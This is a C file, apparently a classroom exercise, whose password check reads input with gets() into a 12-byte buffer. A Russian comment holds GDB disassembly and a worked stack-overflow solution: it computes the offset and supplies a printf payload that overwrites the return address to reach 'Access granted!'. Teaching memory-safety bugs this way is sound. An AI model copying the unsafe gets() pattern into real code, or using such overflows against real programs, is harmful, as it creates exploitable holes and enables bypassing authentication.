#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int IsPassOk(void);
int main(void)
{
  int PwStatus;
  puts("Enter password:");
  PwStatus = IsPassOk();
  if (PwStatus == 0) {
    printf("Bad password!\n");
    exit(1);
  } else {
    printf("Access granted!\n"); // Строка для которой нужно
                                 // выяснить адрес
	}
  return 0;
}

int IsPassOk(void)
{
  char Pass[12];
  gets(Pass);
  return 0 == strcmp(Pass, "test");
}
/*
Пояснение:
main:
0x0000555555555169 <main+0>:  push   %rbp
0x000055555555516a <main+1>:  mov    %rsp,%rbp
0x000055555555516d <main+4>:  sub    $0x10,%rsp
0x0000555555555171 <main+8>:  lea    0xe8c(%rip),%rax        # 0x555555556004
0x0000555555555178 <main+15>: mov    %rax,%rdi
0x000055555555517b <main+18>: call   0x555555555030 <puts@plt>
0x0000555555555180 <main+23>: call   0x5555555551bd <IsPassOk>
0x0000555555555185 <main+28>: mov    %eax,-0x4(%rbp)
0x0000555555555188 <main+31>: cmpl   $0x0,-0x4(%rbp)
0x000055555555518c <main+35>: jne    0x5555555551a7 <main+62>
0x000055555555518e <main+37>: lea    0xe7f(%rip),%rax        # 0x555555556014
0x0000555555555195 <main+44>: mov    %rax,%rdi
0x0000555555555198 <main+47>: call   0x555555555030 <puts@plt>
0x000055555555519d <main+52>: mov    $0x1,%edi
0x00005555555551a2 <main+57>: call   0x555555555060 <exit@plt>
0x00005555555551a7 <main+62>: lea    0xe74(%rip),%rax        # 0x555555556022
0x00005555555551ae <main+69>: mov    %rax,%rdi
0x00005555555551b1 <main+72>: call   0x555555555030 <puts@plt>
0x00005555555551b6 <main+77>: mov    $0x0,%eax
0x00005555555551bb <main+82>: leave
0x00005555555551bc <main+83>: ret

IsPassOk:
0x00005555555551bd <IsPassOk+0>:  push   %rbp
0x00005555555551be <IsPassOk+1>:  mov    %rsp,%rbp
0x00005555555551c1 <IsPassOk+4>:  sub    $0x10,%rsp
0x00005555555551c5 <IsPassOk+8>:  lea    -0xc(%rbp),%rax
0x00005555555551c9 <IsPassOk+12>: mov    %rax,%rdi
0x00005555555551cc <IsPassOk+15>: mov    $0x0,%eax
0x00005555555551d1 <IsPassOk+20>: call   0x555555555050 <gets@plt>
0x00005555555551d6 <IsPassOk+25>: lea    -0xc(%rbp),%rax
0x00005555555551da <IsPassOk+29>: lea    0xe51(%rip),%rdx        #
0x555555556032 0x00005555555551e1 <IsPassOk+36>: mov    %rdx,%rsi
0x00005555555551e4 <IsPassOk+39>: mov    %rax,%rdi
0x00005555555551e7 <IsPassOk+42>: call   0x555555555040 <strcmp@plt>
0x00005555555551ec <IsPassOk+47>: test   %eax,%eax
0x00005555555551ee <IsPassOk+49>: sete   %al
0x00005555555551f1 <IsPassOk+52>: movzbl %al,%eax
0x00005555555551f4 <IsPassOk+55>: leave
0x00005555555551f5 <IsPassOk+56>: ret

Решение:

Выделено 16 байт на стеке
0x00005555555551c1 <IsPassOk+4>:  sub    $0x10,%rsp
Pass начинается по адресу rbp-0xc (12 байт)
0x00005555555551c5 <IsPassOk+8>:  lea    -0xc(%rbp),%rax

Адрес возврата начинается с rbp+8 байт.
Чтобы попасть к адресу возврата нам нужно (rbp+8) - (rbp-0xc) = 8 + 12 = 20 байт

Переход если пароль правильный
0x000055555555518c <main+35>: jne    0x5555555551a7 <main+62>
Вывод "Access granted!"
0x00005555555551a7 <main+62>: lea    0xe74(%rip),%rax

Следовательно нам нужно попасть в:
[12 байт: заполнение массива Pass] +
[8 байт: перезапись сохраненного rbp (любые данные)] +
[8 байт: адрес 0x5555555551a7 в little-endian]

Ставим точку останова на выводе "Access granted!":
break *0x5555555551a7

Запускаем программу с передачей в поток ввода нашей строки c адресом
0x5555555551a7 в последних 8 байтах для возврата на этот участок.
run < <(printf "AAAAAAAAAAAAAAAAAAAA\xa7\x51\x55\x55\x55\x55\x00\x00")

Попадаем на нужную ветку.
 */
